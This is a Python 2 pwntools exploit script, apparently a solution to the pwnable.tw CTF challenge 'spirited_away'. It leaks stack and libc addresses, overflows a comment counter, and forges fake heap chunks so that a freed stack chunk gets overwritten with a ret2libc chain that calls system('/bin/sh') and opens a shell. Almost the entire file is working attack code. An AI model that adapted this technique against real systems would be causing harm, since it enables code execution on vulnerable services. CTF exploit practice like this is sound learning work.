#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    # os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

# context.arch = "amd64"
context.arch = "i386"
# context.log_level = 'debug'
execve_file = './spirited_away'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('chall.pwnable.tw', 10204)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    # b *0x80486F8
    b *0x8048771
    b free
    b malloc
    c
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

sh.sendafter('Please enter your name: ', 'aaaa')

sh.sendafter('Please enter your age: ', '1\n')
sh.sendafter('Why did you came to see this movie? ', 'c' * 56)
sh.sendafter('Please enter your comment: ', 'dddd')

sh.recvuntil('c' * 56)
stack_addr = u32(sh.recvn(4))
log.success('stack_addr: ' + hex(stack_addr))

sh.recvn(4)

libc_addr = u32(sh.recvn(4)) - libc.symbols['fflush'] - 11
log.success('libc_addr: ' + hex(libc_addr))

sh.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

for i in range(9):
    sh.sendafter('Please enter your name: ', 'a\0')
    sh.sendafter('Please enter your age: ', '1\n')
    sh.sendafter('Why did you came to see this movie? ', 'c\0')
    sh.sendafter('Please enter your comment: ', 'd\0')
    sh.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

for i in range(90):
    sh.sendafter('Please enter your age: ', '1\n')
    sh.sendafter('Why did you came to see this movie? ', 'c\0')
    sh.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

sh.sendafter('Please enter your name: ', 'a\0')
sh.sendafter('Please enter your age: ', '1\n')
sh.sendafter('Why did you came to see this movie? ', 'g' * 8 + p32(0) + p32(0x41) + 'f' * 0x38 + p32(0) + p32(0x11))
sh.sendafter('Please enter your comment: ', 'e' * 72 + p32(0) + p32(0) + p32(1) + p32(stack_addr - 0x60))
sh.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

layout1 = [
    0, # ebp

    libc_addr + libc.symbols['system'],
    libc_addr + libc.symbols['exit'],    
    libc_addr + libc.search('/bin/sh\0').next(),
]

sh.sendafter('Please enter your name: ', 'z' * 64 + flat(layout1))
sh.sendafter('Please enter your age: ', '1\n')
sh.sendafter('Why did you came to see this movie? ', 'c\0')
sh.sendafter('Please enter your comment: ', 'd\0')
sh.sendafter('Would you like to leave another comment? <y/n>: ', 'n')

sh.interactive()
clear()